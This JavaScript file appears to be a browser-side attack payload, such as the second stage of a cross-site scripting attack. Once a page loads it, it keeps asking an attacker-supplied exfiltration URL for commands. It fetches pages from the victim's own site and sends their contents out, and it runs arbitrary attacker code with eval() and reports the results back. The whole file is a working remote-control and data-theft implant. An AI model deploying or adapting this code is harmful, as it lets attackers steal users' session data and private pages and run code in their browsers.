// Javascript file

var exfilURL = "{{EXFIL-URL}}";
var inputUri =  "/exfil-input";
var outputURL = exfilURL + "/exfil-output";

/*
 * Extract body from response
 */
function read_body(xhr) {
    var data;

    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    }
    else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    }
    else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    }
    else {
        data = xhr.response;
    }

    return data;
}

/*
 * Main loop
 */
function mainLoop() {
    for (; ;) {
        let inputDataResponse = getInputCmd(inputUri);

        if (inputDataResponse.length < 4) {
            var outputXhr = new XMLHttpRequest();
            outputXhr.open("POST", outputURL, false);
            outputXhr.send("Too short command : " + inputDataResponse);
        }

        if (inputDataResponse.slice(0, 4) === "EXIT") {
            break;
        } else if (inputDataResponse.slice(0, 4) === "GET ") {
            getCmd(outputURL, inputDataResponse.slice(4, inputDataResponse.length));
        } else if (inputDataResponse.slice(0, 5) === "EVAL ") {
            evalCmd(outputURL, inputDataResponse.slice(5, inputDataResponse.length));
        } else {
            var outputXhr = new XMLHttpRequest();
            outputXhr.open("POST", outputURL, false);
            outputXhr.send("Unknown command : " + inputDataResponse);
        }
    }
}

/*
 * Retrive input command from the server
 */
function getInputCmd(input) {
    let inputDataResponse;

    let inputXhr = new XMLHttpRequest();
    inputXhr.open("GET", input, false);
    inputXhr.send(null);

    inputDataResponse = read_body(inputXhr);


    return inputDataResponse
}

/*
 * Execute a GET request from the client and send the response to the server
 */
function getCmd(outputURL, requestedURL) {
    let dataResponse;

    try {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", requestedURL, false);

        xhr.send(null);
        dataResponse = read_body(xhr);
    }
    catch (err) {
        dataResponse = "Error with GET : " + requestedURL + "\n" + err;
    }

    let outputXhr = new XMLHttpRequest();
    outputXhr.open("POST", outputURL, false);
    outputXhr.send(dataResponse);
}


/*
 * Evaluate the command from the client context and send the output to the server
 */
function evalCmd(outputURL, cmd) {
    let dataResponse;

    try {
        dataResponse = eval(cmd);
    }
    catch (err) {
        dataResponse = "Error with command : " + cmd + "\n" + err;
    }

    let outputXhr = new XMLHttpRequest();
    outputXhr.open("POST", outputURL, false);
    outputXhr.send(dataResponse);
}

window.onload = mainLoop();